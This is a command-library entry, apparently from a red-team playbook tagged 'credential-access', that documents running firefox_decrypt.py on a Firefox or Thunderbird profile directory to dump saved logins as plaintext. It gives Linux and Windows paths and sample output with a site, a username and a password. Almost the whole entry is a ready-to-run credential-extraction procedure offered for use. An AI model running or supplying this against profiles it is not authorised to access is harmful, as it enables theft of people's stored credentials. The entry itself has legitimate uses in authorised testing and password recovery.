---
id: a3f9e79f-9da9-46d1-bb28-a4058903d083
name: firefox-decrypt-extract-passwords-from-profile
type: command
executor: bash
data: python firefox_decrypt.py $_PROFILE_DIRECTORY
output: |-
  root@kali:~/# python firefox_decrypt.py .mozilla/firefox

  Master Password for profile .mozilla/firefox/fx35xcj1.default: 

  Website:   https://mysite.com
  Username: 'root'
  Password: 'secretpassword'
created_at: '2019-10-23T21:39:44.671318+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
  - Windows
tags:
  - credential-access
  - decryption
verified: true
validated: true
---

# firefox-decrypt-extract-passwords-from-profile

## Command

```bash
python firefox_decrypt.py $_PROFILE_DIRECTORY
```

## Description

This command uses the firefox_decrypt Python script to extract and decrypt saved passwords from a Firefox or Thunderbird profile directory. It prompts for the master password (if set) and outputs plaintext credentials from the profile's storage files, such as logins.json and key4.db.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PROFILE_DIRECTORY | Path to the directory containing profiles.ini (e.g., ~/.mozilla/firefox on Linux or %APPDATA%\Mozilla\Firefox\Profiles on Windows) | Yes |

## Examples

### Basic Usage

```bash
python firefox_decrypt.py ~/.mozilla/firefox
```

### Windows Usage

```cmd
python firefox_decrypt.py %APPDATA%\Mozilla\Firefox\Profiles
```

## Expected Output

```
root@kali:~/# python firefox_decrypt.py .mozilla/firefox

Master Password for profile .mozilla/firefox/fx35xcj1.default: 

Website:   https://mysite.com
Username: 'root'
Password: 'secretpassword'
```

If the master password is incorrect or no passwords are found, an error message or empty output will appear, with no credentials decrypted.

## Related

- [[procedures/Extract-Firefox-and-Thunderbird-Passwords-from-Profiles]]
- [[tools/Firefox-Decrypt]]
